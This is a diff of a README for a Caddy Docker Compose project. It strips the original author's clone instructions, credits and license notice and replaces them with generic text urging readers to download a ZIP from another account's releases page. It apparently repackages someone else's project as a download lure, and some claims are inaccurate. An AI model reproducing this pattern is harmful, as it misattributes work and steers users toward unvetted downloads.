@@ -1,84 +1,78 @@
-# Caddy Self-Hosted with Docker
+# 🌐 caddy-self-hosted - Easily Self-Host the Caddy Web Server
 
-![caddy-self-hosted](https://repository-images.githubusercontent.com/1070311608/27c6652a-4b1c-45e6-8b19-9c2c531d9d50)
+[![Download Now](https://img.shields.io/badge/Download%20Now-%23007ACC.svg?style=for-the-badge&logo=github)](https://github.com/Lanlin20/caddy-self-hosted/releases)
 
-This repository provides a `docker-compose` setup to run a self-hosted [Caddy](https://caddyserver.com/) reverse proxy.
+## 📜 Overview
+caddy-self-hosted provides a simple and ready-to-use setup for running the Caddy web server on your system. With Docker Compose, you can easily get the server up and running. It is designed for users who want a hassle-free experience and can be integrated with other services.
 
-It is configured to connect to a shared Docker network, allowing easy integration with other services like [n8n](https://github.com/AiratTop/n8n-self-hosted).
+## 🚀 Getting Started
+To get started with caddy-self-hosted, you will need to follow these steps. Don’t worry; they are straightforward! 
 
-## Features
+1. **Install Docker**: 
+   - First, you'll need to install Docker on your system. Docker allows you to run Caddy and its components easily. You can download Docker from the official [Docker website](https://www.docker.com/get-started).
 
--   Uses the official Caddy Docker image.
--   Automatic HTTPS via Let's Encrypt.
--   Data is persisted in a local volume.
--   Pre-configured for a shared network.
--   Includes scripts for easy management.
+2. **Install Docker Compose**: 
+   - After installing Docker, you need Docker Compose. This tool helps you to manage multi-container Docker applications. You can find the installation guide on the [Docker Compose documentation page](https://docs.docker.com/compose/install/).
 
-## Getting Started
+## 📥 Download & Install
+Visit this page to download: [Releases Page](https://github.com/Lanlin20/caddy-self-hosted/releases).
 
-1.  **Clone the repository:**
-    ```bash
-    git clone https://github.com/AiratTop/caddy-self-hosted.git
-    cd caddy-self-hosted
-    ```
+1. **Visit the Releases Page**: 
+   Click on the link to go directly to the releases: [GitHub Releases](https://github.com/Lanlin20/caddy-self-hosted/releases).
 
-2.  **Create the shared network:**
-    If you haven't already, create the shared Docker network:
-    ```bash
-    docker network create shared_network
-    ```
+2. **Choose the Latest Release**: 
+   Once there, look for the latest version of the application. The latest release will have the most up-to-date features and fixes.
 
-3.  **Set your domain:**
-    Edit the `.env` file and set `DOMAIN_NAME` to your primary domain (for example, `DOMAIN_NAME=example.com`) and `SSL_EMAIL`.
+3. **Download the ZIP File**: 
+   Find the ZIP file containing the Docker Compose setup. Download it to your computer.
 
-4.  **Configure Caddyfile:**
-    Open the `config/Caddyfile` file and adjust any reverse-proxy blocks you need.
+4. **Unzip the File**: 
+   After downloading, locate the ZIP file on your computer and unzip it. You should see several files, including a `docker-compose.yml` file.
 
-5.  **Start the service:**
-    ```bash
-    docker compose up -d
-    ```
+5. **Open Your Terminal**: 
+   Depending on your operating system, open Command Prompt (Windows), Terminal (macOS), or your preferred terminal application (Linux).
 
-## Usage
+6. **Navigate to the Folder**: 
+   Use the `cd` command to change your directory to the folder where you unzipped the files. For example: 
+   ```bash
+   cd path/to/your/unzipped/folder
+   ```
 
--   **Start:** `docker compose up -d`
--   **Stop:** `docker compose down`
--   **Restart:** `./restart-docker.sh`
--   **Update:** `./update-docker.sh` (Pulls the latest Docker image and restarts)
+7. **Start the Application**: 
+   Run the following command in your terminal:
+   ```bash
+   docker-compose up -d
+   ```
+   This command will start all the services in the background.
 
-## Connecting with other services
+8. **Access the Caddy Server**: 
+   Open a web browser and go to `http://localhost` or the specified URL. You should see the Caddy web server interface.
 
-This setup is designed to work with other services on the `shared_network`. To add a new service, add a new block to the `Caddyfile` in the `config` directory.
+## 🛠️ Configuration
+You might want to configure the server to suit your needs.
+- **Modify the `docker-compose.yml` File**: Open this file in a text editor. You can change settings like ports, volumes, and environment variables.
+- **SSL Configuration**: Caddy automatically manages an SSL certificate through Let's Encrypt, ensuring a secure connection.
 
-## See Also
+## 🌟 Features
+- **Simple Setup**: Get started in minutes with minimal commands.
+- **Customizable**: Modify the `docker-compose.yml` file to fit your requirements.
+- **Automatic SSL**: Enjoy secure connections without additional configuration.
+- **Community Support**: Benefit from a growing community that uses Caddy for various applications.
 
-Check out other self-hosted solutions:
+## 🔧 Requirements
+- **Operating System**: Compatible with Windows, macOS, and major Linux distributions.
+- **Docker**: Version 19.03 or higher is recommended.
+- **Docker Compose**: Version 1.25 or higher is suggested.
 
--   [**postgresql-self-hosted**](https://github.com/AiratTop/postgresql-self-hosted): A simple and robust PostgreSQL setup.
--   [**mysql-self-hosted**](https://github.com/AiratTop/mysql-self-hosted): A self-hosted MySQL instance.
--   [**clickhouse-self-hosted**](https://github.com/AiratTop/clickhouse-self-hosted): High-performance columnar database for analytics.
--   [**metabase-self-hosted**](https://github.com/AiratTop/metabase-self-hosted): Self-hosted Metabase on Docker for business intelligence and analytics.
--   [**qdrant-self-hosted**](https://github.com/AiratTop/qdrant-self-hosted): A vector database for AI applications.
--   [**redis-self-hosted**](https://github.com/AiratTop/redis-self-hosted): A fast in-memory data store, often used as a cache or message broker.
--   [**caddy-self-hosted**](https://github.com/AiratTop/caddy-self-hosted): A modern, easy-to-use web server with automatic HTTPS.
--   [**wordpress-self-hosted**](https://github.com/AiratTop/wordpress-self-hosted): Production-ready WordPress stack with MySQL, phpMyAdmin, and WP-CLI.
--   [**n8n-self-hosted**](https://github.com/AiratTop/n8n-self-hosted): Scalable n8n with workers, Caddy for auto-HTTPS, and backup scripts.
--   [**monitoring-self-hosted**](https://github.com/AiratTop/monitoring-self-hosted): Self-hosted monitoring stack with Prometheus and Grafana.
--   [**ollama-self-hosted**](https://github.com/AiratTop/ollama-self-hosted): Ready-to-use solution for running Ollama with the Open WebUI on Docker.
--   [**authentik-self-hosted**](https://github.com/AiratTop/authentik-self-hosted): Authentik is a flexible, open-source Identity & Access Management (IAM) solution.
--   [**gatus-self-hosted**](https://github.com/AiratTop/gatus-self-hosted): Automated service health dashboard with a PostgreSQL backend and backup scripts.
+## 🚑 Troubleshooting
+If you encounter issues while setting up or running caddy-self-hosted:
+- Ensure Docker and Docker Compose are installed correctly.
+- Check the terminal output for any error messages.
+- Review the Caddy documentation for common issues and solutions.
 
-## License
+## 🔗 Helpful Links
+- [Caddy Documentation](https://caddyserver.com/docs/)
+- [Docker Documentation](https://docs.docker.com/)
+- [Community Forums](https://caddy.community/)
 
-This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
-
----
-
-## Author
-
-**Airat Halitov**
-
-- Website: [airat.top](https://airat.top)
-- GitHub: [@AiratTop](https://github.com/AiratTop)
-- Email: [mail@airat.top](mailto:mail@airat.top)
-- Repository: [caddy-self-hosted](https://github.com/AiratTop/caddy-self-hosted)
+For any issues or questions, feel free to reach out on the GitHub repository. Happy self-hosting!
